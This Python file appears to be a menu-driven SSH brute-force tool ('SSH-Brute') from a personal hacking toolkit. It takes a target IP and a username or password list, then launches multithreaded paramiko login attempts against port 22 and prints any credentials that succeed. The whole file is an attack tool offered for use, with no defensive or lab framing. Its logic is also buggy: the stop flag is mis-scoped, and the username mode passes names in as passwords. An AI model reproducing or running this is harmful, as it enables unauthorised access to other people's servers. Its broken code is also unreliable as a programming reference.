import os
from termcolor import colored
c = colored
def sbrute():
	import paramiko, sys, os, socket, termcolor, threading, time, start
	def option2():
		print("\n")
		print(c("[----] Password only [1]", "green"))
		print(c("[----] Username only (if you have a possible pass but no user) [2]", "red"))
		option2 = int(input(c("[----] Chose an option: ", "white")))
		if option2 == 2:
			os.system("clear")
			usernameo()
		elif option2 == 1:
			os.system("clear")
			passwordo()
	def option1():
		print("\n")
		print(c("[----] Continue using SSH-Brute [1]", "green"))
		print(c("[----] Go back to main screen [2]", "red"))
		option1 = int(input(c("[----] Chose an option: ", "white")))
		if option1 == 2:
			os.system("clear")
			start.begin()
		elif option1 == 1:
			os.system("clear")
			option2()

	def passwordo():
		stop_flag = 0
		print(c("       _____ _____ _    _            ____             _        ", "green"))
		print(c("      / ____/ ____| |  | |          |  _ \           | |       ", "blue"))
		print(c("     | (___| (___ | |__| |  ______  | |_) |_ __ _   _| |_ ___  ", "white"))
		print(c("      \___ \ ___ \|  __  | |______| |  _ <| '__| | | | __/ _ \ ", "red"))
		print(c("      ____) |___) | |  | |          | |_) | |  | |_| | ||  __/ ", "yellow"))
		print(c("     |_____/_____/|_|  |_|          |____/|_|   \__,_|\__\___| ", "magenta"))
		print("   <<<<<----->= SSH Brute Forcer By: IAmFalseBeliefs <=----->>>>>")
		print("     <<<<<----->=          Brutes Made Easy         <=----->>>>>")
		print(c("<<<<<----->= Use my PortScanner to see if ssh is open <=----->>>>>", "blue"))
		print(c("     <<<<<----->= I used multi-threading for this <=----->>>>>", "yellow"))
		print("\n")
		host = input("[----] Target IP address (SSH port 22): ")
		username = input("[----] Target Username (SSH port 22): ")
		pass_file = input("[----] Password file path: ")
		print("[----] Attempting brute force on " + username + " on host: " + host)
		def ssh_connect(password, code = 0):
			global stop_flag
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			try:
				ssh.connect(host, port = 22, username = username, password = password)
				stop_flag = 1
				print(c("[----] Brute complete use password: " + password + " for Account: " + username, "green"))
			except:
				print(c("[----] Incorrect password: " + password, "red"))
			ssh.close()
		if os.path.exists(pass_file) == False:
			print("[=--=] Check spelling, file doesnt exist")
			sys.exit(1)
		with open(pass_file, 'r') as file:
			for line in file.readlines():
				if stop_flag == 1:
					t.join()
					exit()
				password = line.strip()
				t = threading.Thread(target = ssh_connect, args = (password,))
				t.start()
				time.sleep(0.5)

	def usernameo():
		print(c("       _____ _____ _    _            ____             _        ", "green"))
		print(c("      / ____/ ____| |  | |          |  _ \           | |       ", "blue"))
		print(c("     | (___| (___ | |__| |  ______  | |_) |_ __ _   _| |_ ___  ", "white"))
		print(c("      \___ \ ___ \|  __  | |______| |  _ <| '__| | | | __/ _ \ ", "red"))
		print(c("      ____) |___) | |  | |          | |_) | |  | |_| | ||  __/ ", "yellow"))
		print(c("     |_____/_____/|_|  |_|          |____/|_|   \__,_|\__\___| ", "magenta"))
		print("   <<<<<----->= SSH Brute Forcer By: IAmFalseBeliefs <=----->>>>>")
		print("     <<<<<----->=          Brutes Made Easy         <=----->>>>>")
		print(c("<<<<<----->= Use my PortScanner to see if ssh is open <=----->>>>>", "blue"))
		print(c("     <<<<<----->= I used multi-threading for this <=----->>>>>", "yellow"))
		print("\n")
		host = input("[----] Target IP address (SSH port 22): ")
		password = input("[----] Target password (SSH port 22): ")
		user_file = input("[----] Username file path: ")
		#print("[----] Attempting brute force on " + username + " on host: " + host)
		def ssh_connect(password, code = 0):
			global stop_flag
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			try:
				ssh.connect(host, port = 22, username = username, password = password)
				stop_flag = 1
				print(c("[----] Brute complete use password: " + password + " for Account: " + username, "green"))
			except:
				print(c("[----] Incorrect username: " + username, "red"))
			ssh.close()
		if os.path.exists(user_file) == False:
			print("[=--=] Check spelling, file doesnt exist")
			sys.exit(1)
		with open(user_file, 'r') as file:
			for line in file.readlines():
				username = line.strip()
				t = threading.Thread(target = ssh_connect, args = (username,))
				t.start()
				time.sleep(0.5)
	option1()